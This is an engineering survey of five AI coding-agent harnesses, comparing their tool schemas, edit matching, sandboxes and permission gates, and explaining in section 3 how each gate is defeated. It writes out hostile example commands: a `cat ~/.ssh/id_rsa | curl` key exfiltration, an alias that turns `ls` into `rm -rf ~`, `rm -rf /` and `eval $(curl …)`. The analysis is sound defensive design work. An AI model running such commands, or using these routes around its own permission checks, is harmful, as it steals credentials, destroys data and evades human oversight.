# Tool-set survey - five agent harnesses, read as interfaces

Six codebases read in parallel by subagents, on lab2x1: tool names, argument schemas, return
shapes, documented behaviour, and the gate in front of each. No implementation code was copied;
model-facing description strings are quoted because those are the artefact under study.

| harness | identity | licence |
|---|---|---|
| grok-build | `SOURCE_REV` `eb4a894d` | Apache-2.0 |
| opencode | v1.18.29 | MIT |
| pi | `@earendil-works/pi-coding-agent` v0.85.1 | MIT |
| omp (oh-my-pi) | v18.1.15 | MIT |
| deepseek-harness | `dsh-0.1.5-alpha.1` | MIT |
| letibot | for comparison | - |

The set surveyed in each is the one the shipped CLI assembles. **Deliberately excluded:** `omo/`,
`omo-slim/` (Sustainable Use Licence) and `crush` (Functional Source Licence 1.1) - both restrict
derivative use, which makes reading them as prior art a legal question, not an engineering one.

## The scorecard

| | opencode | pi | omp | grok-build | dsh | **letibot** |
|---|---|---|---|---|---|---|
| **1.** search reports a files-searched denominator | no | no | **computed, withheld** | no | no | **yes** |
| … zero-files distinguished from zero-matches | no | no | timeout only | no | no | **yes** |
| **2.** read-before-write enforced at runtime | **no** (falsely claimed) | no | **yes** (digest) | **no** (says so) | **yes** (stat CAS) | **yes** (per-line) |
| **3.** structural / AST tool | no | no | **yes** | no | no | **yes** (`outline`) |
| … LSP navigation tool | flag-gated | no | yes | flag-gated | not mounted | yes |
| **4.** subagent spawn tool | yes | example only | yes | yes | yes | **yes** |
| … concurrency ceiling | **none** | 4 (example) | 32 | 32 | **none** | none found |
| … depth ceiling | 1 | n/a | 2 | 1 | 3 | 3, refused by name |
| **5.** output capped by default | yes | yes | yes | yes | yes | **no** (unset) |
| … told it was truncated | yes | yes | yes | mostly | yes | yes |
| … given a way to fetch the rest | spill path | offset + spill | `artifact://` | spill path | spill path | **`read_spill`** |
| **6.** edit matching | **fuzzy, written** | **fuzzy, written** | **fuzzy, written** | relaxed (opt-in) | **exact only** | **exact only** |
| … model told the match was relaxed | no | no | no | no | n/a | n/a (never applied) |

**Nobody has row 1.** omp comes closest and then throws the number away. **Three of five write a
match the model did not ask for and do not mention it.** Only two enforce the read-before-write
rule that four of them talk about.

## 1. The catalogue

**opencode** - `bash` (non-zero exit is **not** an error; the code goes to `metadata.exit`),
`read` (a numbered window plus up to three fuzzy siblings on a miss), `glob`, `grep`,
`edit`/`write`/`apply_patch` (`apply_patch` is the only edit route for `gpt-*`), `task`,
`webfetch`, `websearch`, `todowrite`, `skill`, `question`, `plan_exit`, `lsp` (nine operations,
behind an experimental flag), `execute`, `invalid` (a decoy). Its default ruleset is `"*":
"allow"`, nine tools send `always: ["*"]`, and there is **no sandbox** - and because an approved
grant is searched *after* the config ruleset in a last-match-wins list, **one "Always" click
silently disables any config `deny` the pattern covers, including opencode's own `.env` guard.**

**pi** - four tools active: `read`, `bash`, `edit`, `write`; `grep`, `find`, `ls` and
`powershell` are opt-in, and there is **no task, todo, web or LSP tool**. `read` gives raw text
with no line numbers and throws a raw `ENOENT` on a miss; `bash` has **no default timeout**;
`grep`/`find` shell out to `rg`/`fd` and **download the binary from GitHub on first use**, so two
nominally read-only tools carry a network side-channel. **No built-in approval system at all**:
the one gate point is a `beforeToolCall` hook that **returns `undefined` immediately if no
extension registered a handler**.

**omp** - **`xd://` device mounting**, on by default: tools declaring `loadMode = "discoverable"`
are **removed from the request's tools array** and driven through `read`/`write` against internal
URLs. That leaves 14 top-level schemas (`read, write, bash, edit, glob, eval, task, hub, learn,
manage_skill, todo, ask, grep, web_search`) and 12 devices (`ast_grep, ast_edit, debug, github,
lsp, checkpoint, rewind, security_scan, memory_edit, retain, recall, reflect`). `read`'s schema is
`path` alone, with every option riding a selector grammar on the path (`:50-200`, `:raw`, `?q=`,
`archive.zip:inner`); `browser` and `computer` are **not tools** but preludes in `eval`. Tiers
`read < write < exec` against modes `always-ask` / `write` / `yolo`, with **an omitted `approval`
defaulting to `exec`**; `details` is UI-only, so **anything living only in `details` never reaches
the model**.

**grok-build** - seventeen core tools plus conditionals and a plan-mode trio, and **model-facing
names are not tool ids**: five tools and two params are renamed (`task` → `spawn_subagent`) and
full name randomization per deployment is supported. Auto-allow: `read_file`, `list_dir`, `grep`,
`web_search`, `lsp` (off by default), `todo_write`, `update_goal`; prompts: `search_replace`,
`run_terminal_command`/`monitor`, `use_tool`; no prompt at all: `spawn_subagent`, `workflow`,
`scheduler_*`, `image_*`. **Two classification gaps**: those have no explicit `AccessKind` arm and
fall through a catch-all `_ => Read(None)`, and `Read` is *unconditionally allowed* with no path,
so a path-patterned rule cannot match it. Scopes are inconsistent both ways: `scheduler_list`
declares `Write` for a pure read, while `todo_write` and `update_goal` declare `Read` while
mutating session state (letibot's `Access` has a `Session` class for exactly this). `search_tool`
**does not search code** - it is BM25 over the MCP tool index.

**dsh** - a Cordis monorepo where ~25 tools are separate plugin packages and **which ones the
model sees is a composition decision**. The model sees only `name`/`description`/`parameters`;
schemas carry no constraints beyond type/enum/const/default, so every numeric bound is an
execute-time throw, and every throw becomes a soft error result. `dsh-base`, `standard` and `ptc`
mount `bash`/`pwsh` one-shot, the fs group, `job_*`, `skill`, `todo_write`, the goal tools,
`exit_plan_mode`, five subagent tools, `workflow`, `ralph`, `web_search`, `web_fetch`; `minimal`
mounts a persistent PTY and `str_replace_editor`. **The most distinctive choice in the five:** the
`ptc` preset sends **exactly one tool schema - `run_code`** - plus a generated SDK declaring the
rest, and a direct call naming any other tool is refused. There is a generic `ask` gate, but
**almost no tool uses it**.

**letibot** - eight read-only tools and a wider session set; the ceiling is `DEFAULT_MAX_TOOLS =
16`, and a role that wants more is refused by name rather than truncated. `read`/`grep`/`glob`
carry the denominator and the relaxation ladder; `outline` answers "what does this file define"
**from a parse rather than a pattern**; `ask_code`/`ask_corpus` are retrieval, `NotRun` when
nothing is attached; `read_spill` fetches the rest of a bounded output by content hash; `edit` may
only replace lines a tool displayed; `bash`/`ps`/`pkill`/`monitor`/`jobs` control processes by
handle, never by pattern. `Access` has five values; the default gate is `NoAdjudicator` and
refuses with **`NotRun` - nobody decided - not `Denied`**; and a `NEVER_WRITE` list is evaluated
before any adjudicator and overridable by none.

## 2. The six questions

### 2.1 Does any search tool distinguish "the pattern is not present" from "I searched zero files"?

**Four of the five: no. The fifth computes the number and does not tell the model. letibot is the
only one that reports the denominator** - the defect that prompted the survey, where letibot's
`grep` reported an empty corpus as an empty result about a tree holding nine matches.

- **opencode** returns one shared constant, `"No files found"`, from both `grep` and `glob`, and
  it fires when files *were* searched and nothing matched. Worse, **a `path` that does not exist
  is not an error either**: the ternary falls through to `path.dirname(search)`, so grep silently
  searches the parent directory.
- **pi** has no counter and treats ripgrep's exit 1 as success, so glob-matched-nothing and
  pattern-absent land in one branch; hitting the 100-match cap **kills the rg child**, so the
  search is abandoned and the model is not told how much went unsearched.
- **dsh** has the denominator **available and deliberately dropped**: `parseRecord` skips
  ripgrep's `summary` record and `buildGrepCommand` never passes `--stats`. A missing path does
  surface, so a bad path is loud and a bad glob is silent.
- **grok-build** folds ripgrep's zero-denominator signal into the same `"No matches found"` as a
  genuine zero-match search, and `.gitignore`/`DenyReadGlobs` shrink the corpus with no
  disclosure. Its path case is the best of the five and its timeout says the search may have
  matched files but did not complete.
- **omp computes it, withholds it**: `filesSearched` is threaded through the pipeline but
  `GrepToolDetails` has no such field, and `details` is UI-only. It is the only one that thinks
  about the problem - all-missing paths throw, some-missing paths append `Skipped missing paths:
  {…}`, and **a glob timeout with zero hits is an explicit abstention** (*"the scan is incomplete,
  NOT proof of absence"*).
- **letibot** treats a zero denominator as a **scope failure**: zero files opened is `failed`
  (`` 0 files matched the scope, so `{source}` was never searched for ``), a genuinely absent
  pattern is `abstained` (`` `{source}` does not occur in the {files_scanned} file(s) searched ``),
  and a missing scope path is `failed` with the nearest listing. `scanned` increments only after a
  successful read, so it means *files actually opened as text*.

### 2.2 Does any harness ENFORCE read-before-write, rather than promising it?

**Three of five do not enforce it, and two of those claim in a description string that they do.
Two enforce it, by different mechanisms, and both have a hole.**

| harness | enforced? | mechanism |
|---|---|---|
| opencode | **no** - and falsely claimed | none; `edit` reads the file itself just before writing |
| pi | **no** - and not even claimed | none; `getFileRevision()` exists and every call site is a config store |
| grok-build | **no** - and says so in a code comment | config-time toolset check, once, when the toolset is finalized |
| omp | **yes**, in the default mode | **content digest** - a 4-hex xxhash of the normalized content, minted into a session store by `read`/`grep`/`write` |
| dsh | **yes** | **stat-tuple CAS** (`dev:ino:size:mtimeNs:ctimeNs`) inside a per-target lock |
| letibot | **yes** | **per-line fingerprints** in a session ledger; an edit may only replace lines a tool displayed |

The three that do not enforce it differ only in candour: grok-build's comment says
read-before-edit is "encouraged via description and RL grading, not runtime-enforced" and it has a
test named `consecutive_edits_succeed_without_prior_read`; pi never claims it; opencode ships two
false description strings. Both enforcers gain a distinction mtime cannot make - omp tells a tag
minted this session from one from a prior session, so it can say *"copy the [path#newhash] header
from that edit's response"* instead of *"re-read"*. Their holes: omp's head/tail-only edit
**applies anyway** on mismatch, its stronger guard is wired to a setting that **defaults false**,
and the `replace` mode has no check at all; dsh's enforcement lives in a separate plugin whose own
comment says removing it leaves unconditional mutation.

### 2.3 Structural / AST tools

**One of the five ships a structural tool. Four ship an LSP tool, three of those off by default or
unmounted.** omp is the only real prior art: `ast_grep`/`ast_edit` over `ast-grep-core` and ~58
tree-sitter grammars, with `ast_edit` always dry-running and staging a proposal the model confirms
by writing a reason to `xd://resolve`; plus AST-driven `read` folding, **on by default**, which
gives parseable code a structural summary with bodies elided. That folding is automatic
compression, not a query - there is no parameter to ask for "the symbols in this file", and symbol
search is LSP-backed. The gap in omp's own AST layer is the §2.1 defect one layer up: `ast_grep`
cannot distinguish "language unsupported" from "file unparseable" from "pattern absent", because
all three collapse into one zero-match plus a string list.

LSP: opencode 9 operations behind an experimental flag; grok-build 6, `default_enabled: false`,
needing a hand-written `lsp.json` that is folder-trust gated; dsh 4, mounted in no shipped
composition; omp 14, reachable as an `xd://` device. Two schema mistakes to avoid: opencode
**forces `line` and `character` to be supplied even for `documentSymbol` and `workspaceSymbol`**,
where they are discarded; grok-build takes 0-indexed input and emits 1-based output.

### 2.4 Subagent / task tools

**Four of five ship one; pi ships an example.**

| | opencode | pi (example) | omp | grok-build | dsh |
|---|---|---|---|---|---|
| agent selected by | `subagent_type` param | `agent` param | `agent` per task | `subagent_type` param | **the tool name** - backend bound at load |
| child tool set | derived, denies added | per-agent allowlist | per-agent allowlist | three stacked layers | **the parent's composition, unfiltered by default** |
| **concurrency ceiling** | **none** | **4** | **32** (semaphore) | **32** (queue, not fail) | **none** |
| **depth ceiling** | **1** | n/a | **2**, enforced by the tool disappearing | **1**, `Task` stripped | **3** |

**A ceiling is not optional**: two of the five ship none, and opencode's only limiter is depth
while its own description encourages parallel calls. **A depth limit enforced by omission** (omp)
or by stripping the tool (grok-build) beats a runtime check the model can hit. And **a child's
tool set should be an allowlist** - dsh gives the child the parent's whole composition.

### 2.5 Output capping

**All five cap; four spill to a file or URL and tell the model where. The differences are in what
is capped silently and what has no recovery path.** opencode and omp wrap every tool, pi and
grok-build cap per tool; caps run 2000 lines / 50 KiB (opencode, pi), 3000 / 50 KiB (omp), a
1000-line read window and 40 000 bytes (grok-build), 2000 / 50 000 (dsh); spill targets are a
tool-output directory with a 7-day GC (opencode), a `/tmp` file (pi), `artifact://<id>` (omp), a
plain file path (grok-build), a 0700 per-session path (dsh).

Four properties worth stealing: **the notice's byte cost is reserved inside the cap**, so the
replacement can never exceed it; **`read` is excluded by name** from spilling, to avoid a
read→spill→read loop; **a spill failure fails open**, leaving the original inline so a spill never
turns success into an error; and **the spill directory must be reachable by the model** - opencode
adds it to the external-directory allow-list, which three of the others get wrong. The worst cases
are where a cap has no recovery path: opencode's `grep`/`glob` hard 100-row cap has no pagination
and infers truncation from `rows.length === limit`, so exactly 100 real matches read as truncated;
grok-build's `read_file` **truncates its 1000-line window silently**; dsh's persistent PTY clips
at 16 000 chars keeping the *head* and advises a `grep` on a file that does not exist, and its
compaction pruner inserts `[... tool result middle pruned ...]` with no way back.

### 2.6 Edit tooling shape

**Three of five write a match the model did not ask for and say nothing about it. Two are
exact-only.**

| | matching | threshold | relaxed match written? | model told? |
|---|---|---|---|---|
| opencode | **9 replacers** | **0.65** Levenshtein | **yes** | **no** |
| pi | exact, then **normalizing fuzzy** | none - canonicalization | **yes**, and it rewrites every touched line | **no** |
| omp | **9-step ladder** | **0.95**, fuzzy on by default | **yes**, re-indented to the found site | **no** |
| grok-build | exact + CRLF; unicode-confusable fallback **opt-in, default off** | none - an 8-entry table | **yes** when enabled | **no** |
| dsh | **exact literal only** | n/a | n/a | n/a |
| **letibot** | **exact only**; relaxation is a *diagnosis* | n/a | **never** | n/a - reported, with the exact bytes |

What matters is not the threshold but that **the model is never told**. opencode writes at 0.65 and
answers `"Edit applied successfully."`; the relaxed span is visible only in a permission-ask diff,
and on the stock agent `edit` is `allow`, so no card is shown. pi's behaviour is the most
surprising: **if any edit needed fuzzy matching, the replacement base becomes the fuzzy-normalized
whole file**, so every touched line gets smart quotes folded to ASCII whether the model asked or
not - and `usedFuzzyMatch` appears in neither the result text nor `details`. dsh is exact-only and
says so in the description, which is the cheapest correct answer; its `minimal` preset's
alternative reports the line numbers of ambiguous matches, which `edit` does not. letibot's rule,
from its module doc: **a relaxed match is a diagnosis, never an application** - five
exact-after-key-mapping rungs, every rung an equality test rather than a distance, and the refusal
returns the exact bytes so the retry is a copy.

## 3. Sandboxing and permissions

The first pass covered permission *policy* and never searched for sandbox *mechanism*.

**The assumption going in - that nobody has a real sandbox and it would have to be built from
primitives - is refuted.** Two of the five have genuine kernel enforcement: dsh (bubblewrap, a
*vendored Landlock launcher with its C source included for audit*, macOS Seatbelt, a Windows
restricted-token runner, arbitrated by functional probes and failing closed) and grok-build
(process-wide, via the `nono` crate plus bubblewrap for the deny-a-subpath case Landlock cannot
express, plus two hand-assembled seccomp-BPF filters). pi and opencode say in their own security
documentation that they have none; omp says so in its tool docs. So the question is not "can this
be built" but "which of two working designs to copy": **dsh confines per spawned command and
leaves the harness unconfined; grok-build confines the harness once at startup and lets children
inherit.**

| | grok-build | dsh | omp | opencode | pi |
|---|---|---|---|---|---|
| OS confinement exists | **yes** | **yes** | no | no | no (example only) |
| on by default | **no** - profile resolves to `"off"` | **yes** | - | - | no |
| confines what | **the harness process** | **each spawned child** | - | - | the bash child only |
| when unavailable | built-in profile: warn, run unconfined; custom: exit 1 | **refuse** | - | - | **fail open**, notify only |
| backend chosen by | platform `cfg` + support probe | **functional probe: runs `true` under the profile** | - | - | platform check |
| network egress controlled | per-child seccomp, in 2 of 6 profiles | no (documented gap) | no | no | only via the unshipped example |
| child env filtered | mechanism exists, default no-op | **regex scrub**, and a `.env` may not set `PATH`/`LD_PRELOAD`/`BASH_ENV` | no | no, and it **injects** a token | no |
| credential paths blocked | write-side only | **no** - "every mode permits reading" | no | `*.env` on `read` only | no |
| command parser | **tree-sitter-bash**, node-kind allowlist, fails **closed** | **none, by design** | hand-written scanners; deny path fails **open** | tree-sitter-bash; **fails OPEN** | **none** |
| default for an ungated command | prompt | allow | **allow** (`yolo`) | **allow** (`"*": "allow"`) | **allow** (no gate) |
| grant granularity | prefix; **exact whole-command for dangerous verbs** | **one-shot only** | whole tool | whole tool / `bash *` | n/a |
| grant persistence | **per git repo**, merge-on-write | mode only, never a grant | hand-edited config | in-memory, **per directory** | project trust, hierarchical |
| deny before blanket-approve | yes | n/a | yes | yes - **but an approved `*` outranks a config deny** | n/a |

### The strongest thing each has, and how it is defeated

**dsh** - it **fails closed** (no usable backend is `SANDBOX_UNAVAILABLE`, never unconfined
passthrough), backends are **chosen by functional probe** rather than a version sniff, and
**partial enforcement is reported as partial, in the code**. It confines the persistent PTY once
at spawn and **throws** on any later `sandbox/mode` change, and its "always allow" problem does
not exist because *the vocabulary has no such option*. Defeated three ways, all named by the
project: **reads and network are entirely uncontained** (bwrap omits `--unshare-net`, Seatbelt is
`(allow default)` with only writes denied), so **exfiltration needs no bypass** - `cat
~/.ssh/id_rsa | curl -T- …` is fully permitted; **the harness is unconfined, and a confined child
can write what the harness later executes**; and **a shipped preset undoes it**. The safety of a
dsh deployment is a property of its composition.

**grok-build** - the parser is load-bearing: it walks the tree-sitter tree against node-kind and
punctuation allowlists, returns `None` on the first unrecognised node, and that forces one
conservative whole-script prompt plus findings that act as **grant floors**. Three refinements are
better than anything else in the survey: **basename matching** (`/bin/rm` and `rm.exe` hit the
dangerous list), **grant keys that must round-trip** (the joined prefix must re-parse as the same
single argv, which closes "approve `git status`, get a grant that also matches `git status; rm -rf
/`"), and an **exec-vehicle list** (`xargs`, `find`, `sudo`, `ssh`, `docker`, `npx`) honoured only
as an exact whole-command match. Defeated four ways: **the OS sandbox is off by default** and a
failing built-in profile warns and **continues unconfined**; **shell aliases and functions from
the user's login shell are invisible to the entire stack, and this is the largest gap in the
survey** - the backend captures `declare -f` and `alias -p` and each command is `eval`'d in a
shell that **re-enables alias expansion**, so `alias ls='rm -rf ~'` yields a request classified as
`ls`, an `ALWAYS_SAFE_COMMANDS` entry, that executes `rm`; **`PATH` shims** likewise; and the
match on `ToolInput` is **not exhaustive**, so image generators, `SchedulerCreate` and `Workflow`
fall through to `Read(None)` and are auto-approved with the reason `SAFE_COMMAND`.

**omp** - the strict compound parser rejects the whole analysis on `$`, backticks, `( ) < > * ? [
] { } ~ | ; &`, on control characters even inside quotes, on `VAR=` prefixes, on 14 interpreter
names and on ~90 shell-stateful builtins, and normalises the basename before the denylist lookups;
`printf` is listed because `printf -v` can retarget a later command, `test` because `test -v`
evaluates command substitutions. **How it is defeated: the default configuration, in one line** -
the approval mode defaults to `yolo`, whose tier ceiling is `exec`, the top rank, so everything
auto-approves and `rm -rf /` executes without a prompt; the parser is only consulted for
user-authored `bash.patterns` rules, which default to empty, so **in a default install no parsing
gates anything**. Three further defeats for a user who has configured rules: the `deny`/`prompt`
matcher uses a loose tokenizer and **fails open** when it cannot see the structure; `eval` bypasses
`bash.patterns` entirely; and a genuinely careful containment primitive exists but is **not wired
to the model's tools**.

**opencode** - the parse genuinely decomposes (`$(...)`, chains, subshells and function bodies
each yield their own pattern), and the default TUI opens **no TCP socket at all**. Defeated four
ways: **the parser fails OPEN** - tree-sitter is error-recovering, so malformed input yields
`ERROR` nodes, and if that produces no command descendants the pattern set is empty and the ask
helper **returns before it asks**; **`bash` defaults to allow**, so the command is materialised and
matched against `^.*$`; **one approval widens to a blanket** - for a command not in its 130-entry
arity table the prefix falls back to `tokens.slice(0,1)`, so approving `bash -c 'echo hi'` stores
`bash *`, and neither `bash`, `sh`, `eval`, `xargs` nor `find` is in the table; and **an approved
grant outranks a config `deny`**, which also defeats its own `.env` guard.

**pi** - the only one whose position is "we deliberately do not do this": its security
documentation lists local code execution as out of scope, and the code matches, because the path
that "decides" checks whether any extension registered a handler and **returns `undefined`
immediately** when none did. One good thing worth stealing: **its one gate fails closed** - no
try/catch around the handler, so a throwing check propagates and blocks. Its example sandbox is
not shipped, and even installed it fails open on init error and wraps only subprocesses, so its
`denyRead: ["~/.ssh"]` is enforced against `cat` and not against `read`. A boundary that covers one
of two paths to the same asset is not a boundary.

### The parse, quantified

grok-build decomposes chains per segment and recurses into `bash -c` (depth cap 8), but a here-doc
body is never parsed, `xargs`/`find -exec` payloads are not re-parsed, and unparseable input
**fails closed** into a prompt plus a grant floor. opencode decomposes chains and `$(...)` per node
and test-covers it, but a here-doc body is never seen, `bash -c`/`eval` grants collapse to `bash
*`/`eval *`, `-exec` payloads are invisible, `/bin/rm` is a different key from `rm`, and
unparseable input **fails OPEN with no prompt at all**. omp's strict path rejects the whole
analysis on any of those constructs and falls back - closed on the strict path, **open on the deny
path**.

**First: the best parser in the survey is defeated by something it never looks at.** grok-build
closes every construct above, and then the command runs through `eval` in a shell that has
replayed the user's aliases. The parser sees the text; the shell sees the text *plus* a mutable
name table the parser cannot read. **A permission decision made on a string the shell will
reinterpret is theatre.**

**Second: parse-failure direction is the single highest-leverage line of code in any of these
harnesses.** grok-build turns "I could not parse this" into a prompt plus a grant floor; opencode
turns the same condition into silent execution; omp does both. Same parser technology, opposite
safety properties, one `if`.

**Third: dsh's answer is better than a parser.** dsh has *no* parser, deliberately, and it does
not matter, because a Landlock or Seatbelt write fence is **parse-independent**: `eval $(curl …)`,
a here-doc-fed `python`, `find -exec` and a `PATH`-shadowed binary all hit the same boundary
however they were spelled. The trade is exact and dsh states it - **effects are contained;
capabilities are not classified** - which is why its uncontained reads and network are the right
thing to criticise and its missing parser is not.

So: **parse to tell the human what is about to happen. Never to decide whether it is safe.**

### Is a model doing the permission handling?

**Four of the five: searched and absent. One has it, and it is built correctly.** grok-build's
classifier sits *after* every deterministic layer and can only fill gaps: a rule-match `Ask` never
reaches the model, only a fail-closed one - the parser could not decompose. It is shown the raw
command plus a fixed, harness-owned token glossary (`unparseable_shell`, `env_injection`,
`dangerous_command`, …) carrying no command text, with transcript turns and `AGENTS.md` marked
untrusted, and **every failure path prompts; none allows**. The parse problem is not solved by the
model; it is summarised for it. The four absences: pi has nothing to attach a classifier to;
opencode's small-model tier is called only for session titles; omp's approval path is a pure
function with no inference call; dsh's auxiliary-model purpose enum is closed to `compaction |
session-title`.

## 4. What is worth copying, and what to avoid

### Copy

1. **dsh's sandbox seam, its three properties before its mechanism**: fail closed on no backend;
   choose the backend by running `true` under the candidate profile; report partial enforcement as
   partial, with reasons.
2. **dsh's vendored-helper-with-source pattern** - a static-musl binary that self-restricts and
   then `execvp`s. grok-build pins `nono` because a rule-ordering change re-opened a macOS deny
   bypass; vendored source makes that risk auditable instead of pinned.
3. **dsh's `sandbox/mode`-change fence for a persistent shell**, and its **boot-time bootstrap-env
   refusal**: a project-supplied `.env` may not set `PATH`, `NODE_OPTIONS`, `LD_PRELOAD`/
   `LD_AUDIT`, `BASH_ENV`, `SHELLOPTS`, `PYTHONSTARTUP`, `GIT_SSH_COMMAND` or any `BASH_FUNC_`
   name. `BASH_ENV` "runs a file of the project's choosing on every single `bash -c`". Nobody else
   has it, and it is perhaps twenty lines.
4. **dsh's one-shot-only grant vocabulary**, which makes the whole grant-widening class
   unrepresentable - if you keep an "allow session", persist a mode, never a grant. And **its
   unknown-concurrency-is-exclusive default**: a tool that does not declare itself concurrency-safe
   is a barrier.
5. **grok-build's grant round-trip requirement**, its **exec-vehicle list with pinned scope** (the
   right response to `xargs`/`sudo`/`ssh`/`docker`/`npx` is not to parse their payloads but to
   refuse to let a *prefix* grant cover them), and its **basename normalisation**.
6. **grok-build's classifier architecture**, if a model is plugged in: after every deterministic
   layer, filling only fail-closed gaps; every failure routed to a prompt; refuse to infer an allow
   from prose; enforce a response schema; harness-owned finding tokens carrying no
   attacker-controlled text.
7. **grok-build's project-config asymmetry** - a workspace file may *add* a profile name but never
   *redefine* a global one.
8. **omp's approve-the-post-revision-input ordering**, which closes the mutation-after-approval hole
   pi documents as present; and **pi's no-try/catch-on-the-gate**.

Two verdicts on constructions the brief named. **omp's omitted-`approval`-defaults-to-`exec` is the
right construction behind the wrong ceiling**: `exec` is the top rank, not "requires approval", so
behind `yolo` an unclassified tool is auto-allowed - a fail-safe default is worth nothing behind a
ceiling set to the top. letibot's `Access::is_unattended` is true for `Read` and `Session` only,
and no mode can raise it. And **an exhaustive match with no catch-all, enforced by the compiler**,
is what grok-build lacked and what letibot's five-variant `Access` has.

### Avoid

- **A parser as the primary boundary.** Three harnesses built one; the best of them is defeated by
  an alias table it never reads.
- **Any fail-open on the deciding path.** opencode's empty-pattern set, omp's unmatchable command,
  pi's example sandbox, dsh's hook runner and its invalid-regex matcher. Each converts "nobody
  decided" into "approved" while reading as protection.
- **A boundary that covers one of two paths to the same asset.** dsh avoids it deliberately: bash
  and `write`/`edit` derive one writable-root allowlist from a single canonical
  symlink-resolving helper, and containment compares **filesystem identity (`dev`/`ino`) rather
  than string prefixes**.
- **A write fence with no read fence.** It stops damage and not theft.
- **A model-facing description that claims a boundary the composition does not enforce.**
- **Deferring safety to a composition or preset a later file can swap out.**
- **A hierarchical, permanent trust grant.** Trusting `~` once trusts every repository forever.
- **Environment inheritance by default.** A denylist over environment names is the wrong shape - it
  catches `AWS_SESSION_TOKEN` and misses `GITHUB_PAT`, `NPM_AUTH` and a `DATABASE_URL` with an
  inline password. Use an allowlist.
- **Blanket-approve modes that skip the layer you built.**

## 5. What could not be determined

Nothing was built, run or started; every finding is a static read.

- **grok-build**: whether `schemars` emits a `#[serde(default)]` field as `required`; whether the
  15 `restrict_child_network` call sites cover *every* process spawn (the calls were enumerated,
  the spawns were not); whether `nono`'s `Sandbox::apply` is best-effort or refuses on old kernels;
  and Windows enforcement, which is `cfg(unix)`-only.
- **opencode**: what the model sees for a zero-result `websearch`; whether tree-sitter-bash
  surfaces commands inside **process substitution** (the `$(...)` case is test-covered, `<(…)` is
  not); and how often the fail-open is reachable in practice - the path is unambiguous, its
  trigger frequency is not establishable by reading.
- **omp**: runtime-discovered custom agents cannot be enumerated from a static read; **no
  concurrency ceiling was found for `vibe_spawn`** (absence of evidence, not proof).
- **dsh**: which language servers a real deployment gets (no shipped config configures one); the
  recursion budgets of the out-of-process subagent providers, which is why `maxDepth:
  'provider-managed'` exists as a literal; and the `packages/e2b` group was not opened.
- **pi**: `@anthropic-ai/sandbox-runtime`'s internals are not vendored, so what its profile
  actually permits is outside what can be cited from pi.

One note on a generated document: dsh's `docs/tool-catalog.md` is produced by booting each plugin
and reading `ctx.tools.schemas()`, which makes it unusually trustworthy - but it boots with a
*non-confining* fs backend, so it shows `write`/`edit` without the
`sandbox_permissions`/`justification` parameters the shipped bundle adds. A generated catalog is
still a catalog of one configuration.
